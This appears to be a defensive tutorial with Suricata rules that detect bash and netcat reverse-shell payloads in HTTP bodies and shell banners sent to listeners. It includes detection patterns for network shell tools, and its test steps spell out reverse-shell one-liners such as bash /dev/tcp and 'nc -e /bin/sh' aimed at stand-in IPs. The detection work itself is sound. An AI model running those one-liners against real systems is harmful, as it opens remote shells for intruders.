# Here are Suricata rules to detect on the two following criterea

* Spotting reverse-shell commands moving in cleartext (typical of web-RCE payloads)

* Spotting tell-tale banners/strings sent back by interactive shells (what the listener often sees after connect).  
<br>


**1. HTTP request contains a bash TCP reverse-shell command**

**What it catches:** 
<br>Cleartext payloads like bash -i with /dev/tcp/… and redirections (0>&1) used in many one-liner bash reverse shells delivered via web RCE. <br>
```

alert http $HOME_NET any -> $EXTERNAL_NET any (
  msg:"POSSIBLE RCE: bash TCP reverse shell command in HTTP request";
  flow:to_server,established;
  http.request_body;
  content:"bash -i"; nocase;
  http.request_body;
  content:"/dev/tcp/"; nocase;
  http.request_body;
  content:"0>&1"; nocase;
  classtype:attempted-admin;
  metadata:attack_target Server, created_at 2025_08_18;
  sid:1001001; rev:1;
)
```
<br>**Why this logic:** 

<br>The purpose is to anchor on three distinctive substrings that usually co-occur in the common bash reverse-shell one-liner. Using the http.request_body sticky buffer avoids false positives in headers/URLs and makes the match cleaner.

<br>**How to test (safe & harmless):**

On any host you’re monitoring with Suricata, run a dummy HTTP service:

```
python3 -m http.server 8080
```

From the same or another host that egresses through the monitored interface, send a POST containing the strings (it’s just text):
```
curl -s -X POST http://<server>:8080/ -d 'id; bash -i >& /dev/tcp/1.2.3.4/4444 0>&1'
```
<br>

**2. HTTP request contains netcat reverse-shell indicators**

**What it catches:** Cleartext payloads that explicitly reference ```nc -e ```/``` ncat --exec```, commonly used in web-RCE payloads. <br>
```
alert http $HOME_NET any -> $EXTERNAL_NET any (
  msg:"POSSIBLE RCE: netcat reverse shell flags in HTTP request";
  flow:to_server,established;
  http.request_body; content:"nc "; nocase;
  http.request_body; content:" -e "; nocase; within:10;
  classtype:attempted-admin;
  metadata:attack_target Server, created_at 2025_08_18;
  sid:1001002; rev:1;
)

alert http $HOME_NET any -> $EXTERNAL_NET any (
  msg:"POSSIBLE RCE: ncat exec reverse shell flags in HTTP request";
  flow:to_server,established;
  http.request_body; content:"ncat "; nocase;
  http.request_body; content:" --exec "; nocase; within:20;
  classtype:attempted-admin;
  metadata:attack_target Server, created_at 2025_08_18;
  sid:1001003; rev:1;

)
```
<br>**Why this logic:**

Traditional nc and Nmap’s ncat have distinctive execution flags (-e, --exec). These are strong signals when they appear inside request bodies.

<br>**How to test (safe & harmless):**

```
curl -s -X POST http://<server>:8080/ -d 'nc 203.0.113.10 9001 -e /bin/sh'
curl -s -X POST http://<server>:8080/ -d 'ncat 203.0.113.10 9001 --exec "/bin/bash -i"'
```

**3. “bash -i” interactive shell banner to the listener**

**What it catches:** After a successful ```bash -i ``` reverse shell, the listener side often receives lines like: <br>

* bash: no job control in this shell

* bash: cannot set terminal process group
  
These are highly distinctive and travel to the client (the attacker/listener). Detecting them is useful anywhere you can see that response stream.

```
alert tcp $EXTERNAL_NET any -> $HOME_NET any (
  msg:"REVERSE SHELL: bash interactive shell banner seen (no job control)";
  flow:to_client,established;
  content:"bash: no job control in this shell"; nocase;
  classtype:shellcode-detect;
  metadata:attack_target Client, created_at 2025_08_18;
  sid:1001004; rev:1;
)

alert tcp $EXTERNAL_NET any -> $HOME_NET any (
  msg:"REVERSE SHELL: bash interactive shell banner seen (cannot set tpg)";
  flow:to_client,established;
  content:"bash: cannot set terminal process group"; nocase;
  classtype:shellcode-detect;
  metadata:attack_target Client, created_at 2025_08_18;
  sid:1001005; rev:1;
)
```
<br>**Why this logic:**

These exact strings are emitted by bash -i under typical pseudo-tty conditions and are rarely seen in normal traffic.

<br>**How to test (without launching a shell):**

* Simulate the banner text over TCP. On the “server” side (pretend attacker listener), send just the text back to the client:

```
# Listener that sends the banner string then closes:
printf 'bash: no job control in this shell\n' | nc -l -p 4444

# From the “victim” side (or any client behind HOME_NET) connect:
nc <listener_ip> 4444
```

You’re not spawning a shell — you only push the banner string, which should trigger SIDs 1001004/1001005.

**4. Ncat connection banner to the listener**

**What it catches:** Nmap’s ncat often prints a short banner like Ncat: Connected to … to the peer. This isn’t universal, but it’s a low-noise indicator when present.

```
alert tcp $EXTERNAL_NET any -> $HOME_NET any (
  msg:"REVERSE SHELL: Ncat banner seen";
  flow:to_client,established;
  content:"Ncat: "; depth:6;
  content:"Connected"; distance:0; within:30; nocase;
  classtype:shellcode-detect;
  metadata:attack_target Client, created_at 2025_08_18;
  sid:1001006; rev:1;
)
```
<br>**How to test (safe):**
```
printf 'Ncat: Connected to 203.0.113.10:9001\r\n' | nc -l -p 9001
nc <listener_ip> 9001
```

# Notes, tuning and caveats

* These signatures only fire on cleartext traffic where the strings are visible. They won’t see encrypted channels (TLS/SSH/VPN) or binary protocols. Consider pairing with behavioral detections (e.g., unusual outbound connections to high ports, new long-lived TCP sessions to the internet) for broader coverage.

* Scope with address groups if needed (e.g., only when $HOME_NET → $EXTERNAL_NET for to-server rules, or from $EXTERNAL_NET → $HOME_NET for listener-side banners).

* Reduce false positives using thresholds inside any rule you expect to fire sparsely:

```
threshold: type limit, track by_src, count 1, seconds 60;
```




